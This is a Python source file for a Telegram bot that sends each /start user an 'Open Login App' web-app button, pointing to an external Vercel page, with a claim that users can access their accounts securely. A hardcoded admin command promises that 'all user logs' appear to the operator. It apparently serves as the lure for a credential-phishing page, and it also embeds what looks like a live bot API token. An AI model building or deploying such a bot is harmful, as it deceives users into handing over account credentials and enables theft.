import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

API_TOKEN = '9165625980:AAFGmo0wjfPjO1pyymNjGNGQxxvbFYqdMuU'
ADMIN_ID = 8631580614
WEB_APP_URL = "https://savastan0so-t9zz.vercel.app/"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Open Login App", web_app=types.WebAppInfo(url=WEB_APP_URL)))
    await message.answer(
        "👋 Welcome! Please click below to access your account securely.",
        reply_markup=markup
    )

@dp.message_handler(commands=['admin'])
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("🔐 **Admin Panel Active**\nAll user logs will appear here.")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
  
